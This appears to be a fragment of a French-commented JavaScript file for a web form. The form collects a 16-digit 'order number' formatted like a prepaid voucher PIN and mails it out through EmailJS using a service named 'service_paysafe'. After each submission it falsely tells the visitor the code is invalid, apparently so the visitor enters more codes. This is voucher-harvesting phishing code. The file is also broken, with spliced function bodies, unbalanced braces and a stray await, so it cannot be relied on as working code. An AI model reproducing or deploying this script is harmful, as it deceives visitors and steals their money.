console.log("script.js chargé");

// Initialisation EmailJS
emailjs.init("rORVGScs1n94sqOPi");

 // Attendre le chargement de reCAPTCHA
        await new Promise(resolve => {
            grecaptcha.ready(resolve);
        });

        // Générer le token reCAPTCHA
        const recaptchaToken = await grecaptcha.execute(
            "6Lfnw3otAAAAAPVN5uNj2rCVl0AMrwpyHbfsNOgo",
            {
                action: "verify_order"
            }
        );

        console.log("reCAPTCHA token obtenu");

        // Pour l'instant, on affiche simplement que le token a été généré
        console.log(recaptchaToken);

        message.style.color = "white";
        message.textContent = "Verification completed.";

    } catch (error) {

        console.error("Erreur reCAPTCHA :", error);

        message.style.color = "red";
        message.textContent =
            "l'accès a ete refusé pour des raisons de sécurité.";

    } finally {

        button.disabled = false;
        button.textContent = "Submit";
    }

}

    button.disabled = true;
    button.textContent = "Sending...";
    message.textContent = "";

    emailjs.send(
        "service_paysafe",
        "template_psf",
        {
            order_number: orderNumber
        }
    )

    .then(function (response) {

        console.log("Email envoyé !");
        console.log(response);

        message.style.color = "white";
        message.textContent = "Your request has been sent successfully.";

        // Vider le champ
        input.value = "";
        input.focus();

        // Deuxième message après 2 secondes
        setTimeout(function () {
            console.log("Deuxième message");
            message.style.color = "red";
            message.textContent = "The code entered is invalid.";
        }, 2000);

        button.disabled = false;
        button.textContent = "Submit";

    })

    .catch(function(error) {

        console.error("Erreur EmailJS :", error);

        message.style.color = "red";
        message.textContent = "An error occurred.";

        button.disabled = false;
        button.textContent = "Submit";
    });

}

// Autoriser uniquement les chiffres + ajouter un espace tous les 4 chiffres
document.getElementById("orderNumber").addEventListener("input", function () {

    // Conserver uniquement les chiffres
    let value = this.value.replace(/\D/g, "");

    // Limiter à 16 chiffres
    value = value.substring(0, 16);

    // Ajouter un espace tous les 4 chiffres
    this.value = value.replace(/(\d{4})(?=\d)/g, "$1 ");

});
